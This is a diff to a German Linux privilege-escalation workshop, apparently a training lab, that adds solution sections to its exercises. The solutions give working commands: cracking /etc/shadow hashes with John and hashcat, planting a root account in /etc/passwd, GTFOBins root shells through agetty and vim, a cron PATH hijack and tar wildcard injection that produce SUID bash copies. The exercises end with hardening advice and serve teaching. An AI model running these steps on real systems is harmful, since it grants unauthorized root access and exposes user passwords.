@@ -61,7 +61,9 @@ Wenn du in der Konsole `whoami` eingibst und als Antwort `john` kommt bist du be
 
 ### Manuell
 Am Anfang steht immer die Recherche. Auf was für einem System befinde ich mich? Welche Linux Distribution, welche Kernel-Version?
-Welche User sind noch auf diesem System angelegt? Welche Dateien liegen hier so rum? Mit diesen Infos lassen sich bspw. Kernel Exploits identifizieren, andere User übernehmen oder Passwörter finden.
+Welche User sind noch auf diesem System angelegt?
+Welche Dateien liegen hier so rum?
+Mit diesen Infos lassen sich bspw. Kernel Exploits identifizieren, andere User übernehmen oder Passwörter finden.
 
 #### System
 - `hostname`
@@ -110,6 +112,11 @@ Alle Befehle, welche in der Bash eingegeben wurden, werden im history file (`~/.
 
 ### Aufgabe
 Findet heraus bei mit welchen Credentials sich der User `john` zuletzt bei Docker angemeldet hat.
+
+### Lösung
+```
+history | grep login
+```
 
 ### Lessons Learned
 Nutzt wenn möglich `-stdin` um Passwörter einem Programm mitzugeben.
@@ -169,6 +176,19 @@ Für das knacken des Passworts müssen zwei Schritte durchgeführt werden:
 ### Aufgabe
 Führe die oben genannten Schritte durch, um das Passwort zu knacken. Wie lautet es?
 
+### Lösung
+Unshadowing der `/etc/shadow` Datei. Wir schreiben das Ergebnis ein eine Datei `unshadowed` im Home-Verzeichnis unseres Users John.
+```
+unshadow /etc/passwd /etc/shadow > /home/john/unshadowed
+```
+
+Auf diese Datei wenden wir die Wörterbuch-Attacke mit unserer Passwortliste an.
+```
+john --wordlist=/home/john/top_100.txt /home/john/unshadowed
+```
+
+_pwned._
+
 ### Extra Aufgabe: Hashcat
 Ein weiteres Tool zum cracken von Hashes ist wie bereits genannt Hashcat.
 `hashcat -h` sagt uns, dass hashcat neben dem Hash und einem Wörterbuch einen Hash-Typ und eine Attack-Mode benötgt.
@@ -186,6 +206,20 @@ hashcat -m <Hash-Type-Code> -a 0 <file with hashes> <dictionary file>
 Optional können wir die Ergebnisse noch mit `-o` in eine Datei schreiben lassen.
 
 Auf! Cracke das Passwort mit Hashcat!
+
+### Lösung
+Wir kopieren uns den Hash aus der `/etc/shadow` Datei in eine neue Datei, bspw. `/home/john/hash`.
+
+[Hash Identifier](https://hashes.com/en/tools/hash_identifier) gibt uns als Hash-Typ `md5crypt` an.
+Laut hashcat Hilfe bzw. wiki, ist der entsprechende Mode `500`.
+
+```
+hashcat -m 500 -a 0 /home/john/hash /home/john/top_100.txt
+```
+
+Hashcat cybert jetzt eine Weile und wir schauen interessiert zu.
+
+Wenn hashcat fertig ist, kann man sich das Ergebnis mit `hashcat --show -m 500 /home/john/hash` ausgeben lassen.
 
 ### Lessons Learned
 Schwache Passwörter (insbesondere solche die in Wörtlisten stehen könnten) sind absolut zu vermeiden! Kein Passwort sowieso. Auch Passwörter die sich erraten lassen sind nicht zu empfehlen.
@@ -287,6 +321,36 @@ Aus manchen Programmen kann man bei gesetztem SUID/SGID Flag ausbrechen und und 
 ### Aufgabe
 Finde Dateien mit SUID/SGID-Bit und versuche root-Rechte zu erlangen.
 
+### Lösung
+Wir schauen, welche Dateien das SUD Bit gesetzt haben.
+
+```
+find / -perm -u=s -user root 2>/dev/null
+```
+
+In der Liste finden wir einen Editor (nano).
+Damit können wir die schreibgeschützte ˙/etc/passwd` Datei editieren.
+
+Wir erzeugen dafür einen Passwort-Hash.
+
+```
+# openssl passwd -1 -salt iteratec password123
+$1$iteratec$45qXWta7eRNhUghQ4Uu8q/
+```
+
+Wir fügen mit nano einen neuen User mit dem generierten Passwort-Hash in die `/etc/passwd` Datei ein.
+
+```
+jane:$1$iteratec$45qXWta7eRNhUghQ4Uu8q/:0:0:root:/root:/bin/bash
+```
+
+Oder ein bisschen einfacher: Wir spawnen eine root-Shell mit agetty (gefunden auf [gtfobins](https://gtfobins.github.io/gtfobins/agetty/)):
+```
+agetty -o -p -l /bin/sh -a root tty
+```
+
+Mit dem Befehl `su jane` können wir auf den neuen User wechseln - und haben eine root-shell.
+
 ### Lessons Learned
 Durchsuche dein System mit den o.g. `find` Befehlen, welche Programme das Sticky-Bit gesetzt haben und prüfe auf [gtfobins](https://gtfobins.github.io/), ob das ausgenutzt werden kann.
 
@@ -305,6 +369,22 @@ getcap -r / 2>/dev/null
 ### Aufgabe
 
 Findet eine Datei mit gesetzten Capabilities und den passenden Exploit auf [gtfobins](https://gtfobins.github.io/).
+
+### Lösung
+
+```
+getcap -r / 2>/dev/null
+```
+
+Damit finden wir die Kopie von vim unter /home/john/vim mit erweiterten Rechten.
+
+Auf [gtfobins](https://gtfobins.github.io/gtfobins/vim/) finden wir eine Möglichkeit wie wir uns mit vim und dieser Capability root-Rechte holen können.
+
+```
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+
+Damit setzt vim für sich selbst die uid auf 0 (root) und startet mit diesen Rechten eine Shell.
 
 ### Lessons Learned
 Durchsuche dein System mit `getcap`, welche Programme Capabilitites haben und prüfe auf [gtfobins](https://gtfobins.github.io/), ob das ausgenutzt werden kann.
@@ -333,6 +413,26 @@ Wenn wir ein Skript mit gleichem Namen in einem Verzeichnis hätten, welches vor
 
 Hätte, würde, könnte.. Mach es!
 
+#### Lösung
+In der Pfad-Variable in der crontab steht als erstes das Verzeichnis `/scripts`. Dieses Verzeichnis ist zu unserem Glück für alle schreibbar. Das bedeudet, wir können dort ein Skript `backup_root.sh` ablegen und es wird von Cron ausgeführt, anstelle jenem im `/bin`-Verzeichnis.
+
+Wir nutzen dafür das vorhin kennengelernte SUID Bit aus.
+Dafür kopieren wir uns im Backup-Script die bash an eine andere Stelle und setzen das SUID Bit.
+
+```
+echo 'cp /bin/bash /scripts/bash; chmod +s /scripts/bash' > /scripts/backup_root.sh
+```
+
+Wenn wir die kopierte bash mit dem Argument "-p" starten, behält sie ihre Privilegien und wir haben eine root-Shell.
+
+Alternativ können wir uns in der `/scripts/backup_root.sh` auch einen User mit root Rechten anlegen lassen.
+
+```
+#!/bin/sh
+JANE='jane:\$1\$iteratec\$45qXWta7eRNhUghQ4Uu8q/:0:0:root:/root:/bin/bash'
+sed -n "\|$JANE|q;\$a $JANE" /etc/passwd >> /etc/passwd
+```
+
 ### Schwache Datei-Berechtigungen
 Mit `cat /etc/crontab` sehen wir in der Cron Tabelle u.a. das Skript backup_home.sh. Wir können uns mit `ls -la` die Berechtigungen dieses Skripts ansehen:
 
@@ -346,6 +446,9 @@ Wir sehen, dass jeder User diese Datei bearbeiten kann. Das ist schlecht. Also g
 Dass wir das Skript bearbeiten können sollten wir ausnutzen.
 Ändere das Skript so um, dass es tut was du willst - mit root-Rechten!
 
+#### Lösung
+Wir können uns hier wieder die bash kopieren, mit SUID-Bit ausstatten und mit dem Argument `-p` ausführen, oder alernativ wieder einen neuen User mit root Rechten in der `/etc/passwd` Datei anlegen.
+
 ### Wildcard Injection
 In der Cron Tabelle gibt es einen weiteren interessanten Job, welcher mit root-Rechten läuft: `archive_john.sh`.
 Das Skript erstellt mit tar ein Archiv aller Dateien in `/home/john` und speichert es als `/backup/john.tgz`. Dafür nutzt es das Wildcard `*` um alle Dateien im Verzeichnis `/home/john` dem Archiv hinzuzufügen.
@@ -357,6 +460,32 @@ Aber wie bekommen wir die Argumente in `tar`? Das Skript selbst ist leider nur v
 
 #### Aufgabe
 Injecte die benötigten Argumente in `tar`, um eine root-Shell zu erhalten.
+
+#### Lösung
+Erzeuge im `/home/john` Verzeichniss ein Script welches uns wieder die bash kopiert und mit SUID-Bit versieht.
+
+```
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/john/rootshell.sh
+```
+
+Außerdem erstelle die beiden Argumente als Dateien im `home/john` Verzeichnis
+
+```
+echo "" > "--checkpoint-action=exec=sh rootshell.sh"
+echo "" > --checkpoint=1
+```
+
+Das Kommando welches im Skript durch den Cron Job aufgerufen wird sieht dann folgendermaßen aus:
+
+```
+tar cf /backups/backup.tgz --checkpoint=1 --checkpoint=action=exec=sh rootshell.sh
+```
+
+- checkpoint[=x] - Nutze “checkpoints”: Zeige eine Fortschrittsmeldung alle x Einträge an
+- checkpoint-action=ACTION: Führe ACTION an jedem checkpoint aus, in unserem Fall exec
+- exec=COMMAND: Führe das COMMAND aus, in unserem Fall das Skript welche die Shell kopiert und mit SUID-Bit versieht
+
+Wenn der Job das nächste mal gelaufen ist, sollte `/tmp/bash -p` eine root-Bash spwanen.
 
 ### Lessons Learned
 Prüfe die Jobs, welche du konfiguriert hast.
